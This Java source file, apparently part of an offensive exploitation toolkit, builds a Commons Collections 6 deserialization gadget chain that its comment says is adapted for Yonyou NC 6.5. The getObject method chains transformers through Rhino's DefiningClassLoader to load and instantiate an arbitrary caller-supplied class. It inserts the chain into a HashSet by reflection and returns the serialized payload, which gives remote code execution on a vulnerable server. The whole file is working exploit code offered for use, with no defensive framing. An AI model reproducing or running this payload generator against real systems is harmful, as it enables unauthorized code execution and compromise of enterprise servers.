package com.droplab.Controller.Yongyou.Common;

import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.droplab.Utils.UnSerialize.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.javascript.DefiningClassLoader;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * 用友NC6.5 反序列化构造链改造,利用CC6构造链。
 */
public class CommonsCollections6NC {

    private static CommonsCollections6NC commonsCollections6NC = null;

    public static CommonsCollections6NC instance() {
        if (commonsCollections6NC != null) {

        } else {
            commonsCollections6NC = new CommonsCollections6NC();
        }
        return commonsCollections6NC;
    }

    public byte[] getObject(final byte[] command,final String classname) throws Exception {
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{classname, command}),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new ConstantTransformer(new HashSet())
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return Gadgets.SerializeObject(map);
    }


    public static void main(String[] args) throws NoSuchMethodException {

    }
}
